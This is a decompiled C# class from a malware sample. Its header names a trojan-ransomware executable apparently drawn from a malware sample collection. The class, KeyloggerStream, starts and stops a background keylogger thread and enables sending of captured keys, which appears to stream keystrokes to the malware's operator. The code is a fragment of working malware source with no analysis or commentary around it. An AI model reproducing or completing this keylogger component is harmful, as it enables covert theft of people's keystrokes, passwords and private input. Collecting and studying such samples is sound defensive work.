// Decompiled with JetBrains decompiler
// Type: VanillaStub.Helpers.Services.KeyloggerStream
// Assembly: VanillaStub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EA90E0E3-D3F0-4587-A40F-47A7FA59CCA7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b3851e5c28e260637f2bb0d27bd956234053f958c19d044c30c87ff4b731caac.exe

using System.Security.Permissions;
using System.Threading;

namespace VanillaStub.Helpers.Services
{
  public static class KeyloggerStream
  {
    private static readonly Keylogger K = new Keylogger();
    private static Thread KeyloggerThread = new Thread(new ThreadStart(KeyloggerStream.StartKeylogger));

    private static bool KeyloggerActive { get; set; }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Start()
    {
      if (KeyloggerStream.KeyloggerActive)
        return;
      KeyloggerStream.KeyloggerActive = true;
      Keylogger.SendKeys = true;
      try
      {
        KeyloggerStream.KeyloggerThread.Start();
      }
      catch
      {
      }
    }

    [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
    public static void Stop()
    {
      if (!KeyloggerStream.KeyloggerActive)
        return;
      KeyloggerStream.KeyloggerActive = false;
      Keylogger.SendKeys = false;
      try
      {
        KeyloggerStream.KeyloggerThread.Abort();
        KeyloggerStream.KeyloggerThread = new Thread(new ThreadStart(KeyloggerStream.StartKeylogger));
      }
      catch
      {
      }
    }

    private static void StartKeylogger() => KeyloggerStream.K.InitKeylogger();
  }
}
